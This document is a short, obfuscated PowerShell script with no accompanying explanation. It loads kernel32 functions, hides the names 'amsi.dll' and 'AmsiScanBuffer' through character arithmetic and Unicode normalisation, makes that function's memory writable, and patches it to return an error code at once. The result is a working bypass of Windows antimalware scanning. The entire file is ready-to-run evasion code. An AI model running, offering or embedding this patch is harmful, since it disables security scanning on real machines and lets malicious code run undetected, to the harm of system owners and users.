$ZjZ = @"
using System;
using System.Runtime.InteropServices;
public class ZjZ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr J5ptQWp46Go4muW0r0, string Kz0P1cfo);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr FzcWLAS9RDt9e6, UIntPtr nVK, uint hfMHvhjvyKG0g0, out uint fovq274fHpaxHC01);
}
"@

Add-Type $ZjZ

$o4rFvw2j = [ZjZ]::LoadLibrary("$(('äm'+'sí'+'.d'+'ll').NoRmaLiZe([chaR](21+49)+[ChAr]([byte]0x6f)+[CHar](114+48-48)+[CHar](109)+[CHAr]([Byte]0x44)) -replace [cHAr]([bYTE]0x5c)+[ChaR](112*95/95)+[cHAR](123*19/19)+[chaR](46+31)+[CHAr](110*15/15)+[chAr](125))")
$HWxU8s6i = [ZjZ]::GetProcAddress($o4rFvw2j, "$(('ÃmsìScänBùff'+'êr').normAlIZe([Char]([ByTE]0x46)+[cHaR]([BYte]0x6f)+[ChAr]([byTE]0x72)+[ChaR]([Byte]0x6d)+[chAR](68+30-30)) -replace [chAR](92*13/13)+[chaR](112+22-22)+[cHaR]([bYTe]0x7b)+[CHAR]([BYTe]0x4d)+[cHar](110+39-39)+[CHaR](125+118-118))")
$p = 0
[ZjZ]::VirtualProtect($HWxU8s6i, [uint32]5, 0x40, [ref]$p)
$XiTXDnynGqgJP71i = "0xB8"
$OyxR1YZfmUo8h10zVov = "0x57"
$EGtVNO = "0x00"
$V5tx = "0x07"
$QJuJXc = "0x80"
$woQh6 = "0xC3"
$BqqHTP5uCxSF6wo = [Byte[]] ($XiTXDnynGqgJP71i,$OyxR1YZfmUo8h10zVov,$EGtVNO,$V5tx,+$QJuJXc,+$woQh6)
[System.Runtime.InteropServices.Marshal]::Copy($BqqHTP5uCxSF6wo, 0, $HWxU8s6i, 6)